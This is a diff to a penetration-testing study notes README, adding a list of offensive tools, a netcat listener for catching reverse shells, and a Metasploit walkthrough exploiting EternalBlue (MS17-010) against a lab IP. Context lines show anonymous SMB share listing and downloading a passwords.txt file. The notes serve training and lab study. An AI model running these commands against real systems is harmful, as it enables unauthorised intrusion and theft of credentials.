@@ -37,6 +37,12 @@ Feel free to submit a pull request, with anything from small fixes to tools you'
 - [Shell](#shell)
 - [Netcat](#netcat): Its list of features includes port scanning, transferring files, and port listening: as with any server, it can be used as a backdoor.
 - [Socat](#socat): It is larger and more flexible and has more options that must be configured for a given task. 
+- [Testssl.sh](#testssl.sh): Checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws and more. https://testssl.sh/
+- [Gobuster](#gobuster)
+- [ffuf](#ffuf)
+- [exploitdb](#exploitdb)
+- [Metasploit](#metasploit)
+
 
 
 ### Organization
@@ -576,6 +582,18 @@ Gratuitous ARP = where the source and destination IP are both set to the IP of t
 #### Shell
 
 - Reverse shell	= Initiates a connection back to a "listener" on our attack box.
+```
+nc -lvnp 1234 # The first step is to start a netcat listener on a port of our choosing
+------
+-l # Listen mode, to wait for a connection to connect to us.
+-v # Verbose mode, so that we know when we receive a connection.
+-n # Disable DNS resolution and only connect from/to IPs, to speed up the connection.
+-p # 1234	Port number netcat is listening on, and the reverse connection should be sent to.
+------
+# Now that we have a netcat listener waiting for a connection, we can execute the reverse shell command that connects to us.
+
+
+```
 - Bind shell = "Binds" to a specific port on the target host and waits for a connection from our attack box.
 - Web shell = Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command.
 
@@ -681,4 +699,16 @@ smbclient -N -L \\\\10.129.42.253 # The -L flag specifies that we want to retrie
 smbclient \\\\10.129.42.253\\users # This reveals the non-default share users. Let us attempt to connect as the guest user.
 smb: \bob\> get passwords.txt # Download text
 
+```
+Robots.txt = It is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The robots.txt file can provide valuable information such as the location of private files and admin pages. In this case, we see that the robots.txt file contains two disallowed entries.
+	
+#### Metasploit
+
+```
+msfconsole # Stating Metasploit
+search exploit eternalblue # Search vulnerabilities
+use exploit/windows/smb/ms17_010_psexec # use exploit
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40 # Set configuration
+msf6 exploit(windows/smb/ms17_010_psexec) > check # Check if the target is vulnerable
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit # Exploit the vulnerability
 ```
